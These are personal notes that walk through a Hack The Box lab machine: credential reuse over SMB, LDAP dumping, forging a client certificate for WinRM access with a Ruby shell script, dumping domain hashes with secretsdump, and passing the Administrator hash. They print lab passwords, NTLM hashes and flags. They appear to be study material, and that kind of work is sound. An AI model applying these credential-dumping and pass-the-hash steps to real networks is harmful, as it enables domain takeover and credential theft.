
What can we do with a user name and password
```
prompt off
recurse on
ls
mget *
```
![[Pasted image 20240408013556.png]]

I don't know what's the certificate for now and whether we should generate it or not but will try to do secrets dump and ldapdump 1st.

```
ldapdomaindump ldaps://10.10.10.103 -u 'HTB\Amanda' -p 'Ashare1972'
```
![[Pasted image 20240408014627.png]]

Will run bloodhound on this tomorrow.

It seems like we have to do something with the certificate i guess. Like make a certificate for Amanda.

![[Pasted image 20240408131444.png]]

Will select advanced certificate request as User certificate throughs error at us.
![[Pasted image 20240408131533.png]]

But it's working cause we have to give some kind of output here like a key or something. So will go back to out Nmap result.

```
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2023-11-19T17:59:11+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, 
```

We know that port 5985 and 5986 both are used for winrm and one supports Http and another supports https.
As port 5985 is not working so we need to use port 5986 and for that reason we need certificate.

We will generate a certificate request and a private key : 
```
openssl genrsa -aes256 -out amanda.key 2048
```
![[Pasted image 20240408141724.png]]

```
openssl req -new -key amanda.key -out amanda.csr
```
![[Pasted image 20240408141959.png]]

```
-----BEGIN CERTIFICATE REQUEST-----
MIICijCCAXICAQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUx
ITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDCCASIwDQYJKoZIhvcN
AQEBBQADggEPADCCAQoCggEBAOUU4FjaASHFdmW/JmOqd0TKz61skZ56LJZf9PHM
EK2TuxeqY6/MGpcX/Wv5CNo3R9ab+QnUBCtjloQeUAhMeWwkBt3dam/bU36XSu9Z
ZXgGAq8QsWfprQhvdBtof4B4bRqZKybjIx1ks2ke7DC0BceIpcaWY7hI8eoIWbp7
yEJORqdSxKwvEhdKxywapn8N2sUqlFHw4VBU8sEuB8K7zwhTPkB9AJqSFEIx2Tcb
ZgFRrsUVIP6ThLhyBDn+sGfyhEufyOdl9yWxn4c8ncbioT3lw3DytDwHI6viA+mD
hPaBKLcbBC1A9fHTxp6OvHjvE/GmEyuhORW1MvhMMzDgBZMCAwEAAaAAMA0GCSqG
SIb3DQEBCwUAA4IBAQAg1ad9YxAtYsPwmy+ByQP1YkmVgHytK0m6fZ6Ss0PSfH7z
3UIqNDHqvDUPLHst9jbUApleuWmQWiaT+gbyoNYvubwZTRuSzWwqYMFVuRYLnvgI
oaYVAdxVUvewYGua1G7WRS+8volFRSTlReHktHb3XNnIIaXzPHDNFbA1HaARmY4x
Tx9FNfpglelmfpWMtDJvlfVUzUBUrIVeyR1PIG025x+zgBDROKHuq/2vBPpsQvCl
4ddWWGQ/AQmB5IPYHaGe62OJBh130GdLr0jbtn+RhSWiEpGLvq+HUVSw8qoePusY
W4zcIb4cjyDyaPu9sfK2e7ed6Zx/GF8a0SR4cpL2
-----END CERTIFICATE REQUEST-----
```

What i was doing wrong is that i was entering the wrong key we have to copy the .csr
![[Pasted image 20240408142323.png]]

How we have the key and will simply use a script winrm as you know that we can't connect to it through linux but luckily we have a Ruby library and will use it.

We install 
```
gem install winrm
``` 

Now we are getting this error
![[Pasted image 20240408170210.png]]

![[Pasted image 20240408181853.png]]

What i was doing wrong is that i was giving the wring certnew.cer (i.e the one we have downloaded). Authenticate through SSL using ruby (i.e. winrm)
```
require 'winrm'

# Author: Alamot

conn = WinRM::Connection.new(
  endpoint: 'https://10.10.10.103:5986/wsman',
  transport: :ssl,
  client_cert: 'certnew.cer',
  client_key: 'amanda.key',
  key_pass: 'testing',
  :no_ssl_peer_verification => true
)

command=""

conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
        print(output.output.chomp)
        command = gets
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end
    puts "Exiting with code #{output.exitcode}"
end
```


```
ruby psremote.rb
```
![[Pasted image 20240408221759.png]]


Ldap
```
ldapsearch -x -H ldap://sizzle.HTB.local -D 'amanda@htb.local' -w 'Ashare1972' -b 'dc=htb,dc=local'
```

We are getting a lot of data so will run a ldap query to get only the admin account even though we know about that from the ldap dump

```
ldapsearch -x -H ldap://sizzle.HTB.local -D 'amanda@htb.local' -w 'Ashare1972' -b 'dc=htb,dc=local' "(&(objectClass=user)(memberOf=CN=Domain Admins, CN=Users,DC=htb,DC=local))" | grep sAMAccountName 
```
![[Pasted image 20240410154311.png]]

What is the next go to step is to simply see if we can download the SAM SYSTEM and Security file to dump the hashes locally but i haven no idea how to do that.

But while doing the OSINT i found the hashes of all the users in a file.txt file
```
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c718f548c75062ada93250db208d3178:::

Domain    User  ID  Hash
------    ----  --  ----
HTB.LOCAL Guest 501 -   
amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
mrb3n:1105:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
```

Got the password of Administrator
```
Pass123!
```
![[Pasted image 20240410165928.png]]

```
mrb3n
```


Got the SMB aka valid users even though administrator and mrb3bn password didn't worked.
```
mrlky
```

```
Football#7
```

What i learnt from it is the repeat the process like run the secretdump.py again as it gave error in the amanda time but worked for mrlky. So keep in mind to repeat the process for each user cuz you never knew what you will get.

```
secretsdump.py Sizzle.HTB.local/mrlky:Football#7@10.10.10.103
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de:::
SIZZLE$:1001:aad3b435b51404eeaad3b435b51404ee:19ed5345c5594385f12a292d26cd5206:::
```

Will enumerate know on post enumeration attacks as we have got the valid user names.


Will test the admin password in the SMB client for now
```
cme smb 10.10.10.103 -u 'administrator' -H 'f6b7160bfc91823792e0ac3a162c9267' --shares
```
![[Pasted image 20240411023832.png]]

Let's connect to writeable share for the moment to get the flag
```
smbclient  //10.10.10.103/c$ -U 'administrator' --pw-nt-hash f6b7160bfc91823792e0ac3a162c9267
```
![[Pasted image 20240411024509.png]]

User Flag
```
f48c6cf9668b7207e062e31888bfe8a5
```
![[Pasted image 20240411031015.png]]

Root Flag
```
e8b8cfd4ac3f10c125b471ff69d6db0a
```

But this is the not the intended way to get the flag let's back track and see how things should go when we have the user id of amanda and see how things can escalate from there.

